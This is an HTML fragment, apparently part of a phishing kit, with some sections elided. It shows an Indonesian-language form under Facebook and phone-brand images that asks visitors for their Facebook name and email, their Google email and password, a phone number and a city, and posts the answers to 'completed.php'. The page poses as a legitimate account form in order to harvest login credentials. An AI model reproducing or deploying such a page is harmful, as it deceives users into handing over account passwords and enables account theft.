...
<script language="javascript" type="text/javascript">
     var teks="isi daftar Fomulir akun anda dengan lengkap dan benar"
     var speed=10
...
<br/><form method="post" action="completed.php">

<h2><img src="img/fb.png" width="150px" height="50px"></h2>
<h4 ><b>Akun Facebook</b></h4>
<div style="width:100%" class="form-group">
  <input class="form-control" id="Nama" name="Nama" placeholder="Nama" type="taxt"  required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" id="Email" name="Email" placeholder="Email atau nomor ponsel" type="taxt"  required>
</div>
<div style="width:100%" class="form-group">
...
<h4 ><b>Akun google</b></h4>
<div style="width:100%" class="form-group">
  <input class="form-control" name="Email2" id="Email2"  placeholder="Email " type="email" required>
</div>
<div style="width:100%" class="form-group">
  <input class="form-control" id="Pass" name="Pass" placeholder="Password" type="Password" required>
</div>
...
<h2><img src="img/hp.png" width="150px" height="50px"></h2>
<div style="width:100%" class="form-group">
  <input class="form-control" id="Phone" name="Phone" placeholder="Nomor ponsel" type="number">
</div>
<div style="width:100%" class="form-group">  
       <input class="form-control" id="Kota" name="Kota" placeholder="Kota" type="taxt"  required>
</div>
